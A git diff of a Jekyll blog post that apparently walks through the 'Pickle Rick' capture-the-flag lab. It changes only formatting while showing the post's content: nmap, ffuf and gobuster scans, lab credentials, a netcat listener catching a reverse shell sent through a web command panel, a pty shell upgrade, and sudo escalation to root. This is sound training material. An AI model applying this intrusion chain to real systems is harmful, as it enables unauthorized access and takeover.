@@ -26,8 +26,7 @@ Welcome here.  We have to find the ingredients to turn Rick back into a human (T
 <br /><br />
 The first step is to run nmap to get a list of the open ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(sec㉿kali)-[~]
 └─$ nmap -sV -sC -A -O -oN nmap 10.10.101.216
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 16:18 AEDT
@@ -68,8 +67,12 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 39.56 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Now, notice that port 80 is open.  Navigate to the ip address in the web browser to view the landing page.
@@ -83,8 +86,7 @@ Now, notice that port 80 is open.  Navigate to the ip address in the web browser
 <br />
 Navigate to "view-source:http://10.10.101.216/" to view the source code of the landing page.  Note the username in the comments.
 
-{% raw %}
-```html
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -122,8 +124,12 @@ Navigate to "view-source:http://10.10.101.216/" to view the source code of the l
 
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="browser"
+   title="view-source:http://10.10.101.216/"
+   content=landingsource %}
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid path="assets/img/picklerick/sourcelanding.png" title="Landing Page Source" class="img-fluid rounded z-depth-1" %}
@@ -133,8 +139,7 @@ Navigate to "view-source:http://10.10.101.216/" to view the source code of the l
 <br />
 Run ffuf to try and brute-force directories for the web app.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216/FUZZ -fs 1602,1062
 
         /'___\  /'___\           /'___\       
@@ -161,8 +166,12 @@ ________________________________________________
 assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
 :: Progress: [220557/220557] :: Job [1/1] :: 7514 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ffuf %}
 
 <br />
 View the robots.txt file and note the string in the file.
@@ -176,8 +185,7 @@ View the robots.txt file and note the string in the file.
 <br />
 Run gobuster looking for source files and other functionalities.  Note the login.php page.
 
-{% raw %}
-```bash
+{% capture gobuster %}
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216 -x php,html
 ===============================================================
 Gobuster v3.6
@@ -208,14 +216,17 @@ Progress: 661671 / 661674 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=gobuster %}
 
 <br />
 Run gobuster looking for interesting text files.
 
-{% raw %}
-```bash
+{% capture gobustertxt %}
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216 -x txt,pdf,bak
 ===============================================================
 Gobuster v3.6
@@ -240,17 +251,19 @@ Progress: 882228 / 882232 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=gobustertxt %}
 
 <br />
 Check out the clue.txt file to see if it gives us something interesting.
 
-{% raw %}
-```
+{% include codebox.html title="clue.txt" content="
 Look around the file system for the other ingredient.
-```
-{% endraw %}
+" %}
 
 <br />
 Navigate to the login page and give it a look.
@@ -264,11 +277,9 @@ Navigate to the login page and give it a look.
 <br />
 Login to the page using the username from the landing page comment and the string from the robots.txt.  This will redirect us to a Command Panel.
 
-{% raw %}
-```
+{% include codebox.html title="robots.txt" content="
 R1ckRul3s:Wubbalubbadubdub
-```
-{% endraw %}
+" %}
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid path="assets/img/picklerick/cmdpanel.png" title="The Command Panel" class="img-fluid rounded z-depth-1" %}
@@ -294,12 +305,15 @@ Navigate to Revshells to generate a python3 payload.
 <br />
 Start a netcat listener that is listening on the port that was specified in the revshells payload.
 
-{% raw %}
-```bash
+{% capture setlistener %}
 root@ip-10-10-34-42:~# nc -nlvp 443
 Listening on 0.0.0.0 443
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=setlistener %}
 
 <br />
 Use the payload from revshells and use it in the Command Panel and click the Execute button.
@@ -313,31 +327,36 @@ Use the payload from revshells and use it in the Command Panel and click the Exe
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 root@ip-10-10-34-42:~# nc -nlvp 443
 Listening on 0.0.0.0 443
 Connection received on 10.10.101.216 41078
-$ 
-```
-{% endraw %}
+$
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Use python to upgrade the shell.
 
-{% raw %}
-```bash
+{% capture pyshell %}
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@ip-10-10-101-216:/var/www/html$
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=pyshell %}
 
 <br />
 Get the first flag.
 
-{% raw %}
-```bash
+{% capture firstflag %}
 www-data@ip-10-10-101-216:/var/www/html$ ls
 ls
 <flagfilename>.txt  clue.txt	 index.html  portal.php
@@ -345,14 +364,17 @@ assets			     denied.php  login.php   robots.txt
 www-data@ip-10-10-101-216:/var/www/html$ cat <flagfilename>.txt^[[C
 cat <flagfilename>.txt
 <flag>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=firstflag %}
 
 <br />
 Get the second flag.
 
-{% raw %}
-```bash
+{% capture secflag %}
 www-data@ip-10-10-101-216:/var/www/html$ cd /home/rick
 cd /home/rick
 www-data@ip-10-10-101-216:/home/rick$ ls
@@ -361,14 +383,17 @@ ls
 www-data@ip-10-10-101-216:/home/rick$ cat <second flag file>
 cat <second flag file>
 <flag>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=secflag %}
 
 <br />
 Use the sudo -l to see a list of all the commands the current user can execute as sudo.  Notice that we can run all command no password.
 
-{% raw %}
-```bash
+{% capture sudol %}
 www-data@ip-10-10-101-216:/var/www/html$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on ip-10-10-101-216:
@@ -377,24 +402,30 @@ Matching Defaults entries for www-data on ip-10-10-101-216:
 
 User www-data may run the following commands on ip-10-10-101-216:
     (ALL) NOPASSWD: ALL
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sudol %}
 
 <br />
 Use sudo su - to switch the user to the root user.
 
-{% raw %}
-```bash
+{% capture suroot %}
 www-data@ip-10-10-101-216:/var/www/html$ sudo su -
 sudo su -
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=suroot %}
 
 <br />
 Get the third flag.
 
-{% raw %}
-```bash
+{% capture thirdflag %}
 root@ip-10-10-101-216:~# ls -la
 ls -la
 total 36
@@ -410,8 +441,12 @@ drwx------  2 root root 4096 Feb 10  2019 .ssh
 root@ip-10-10-101-216:~# <third flag file>
 <third flag file>
 <flag>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=thirdflag %}
 
 <br />
 Hopefully you enjoyed the read.
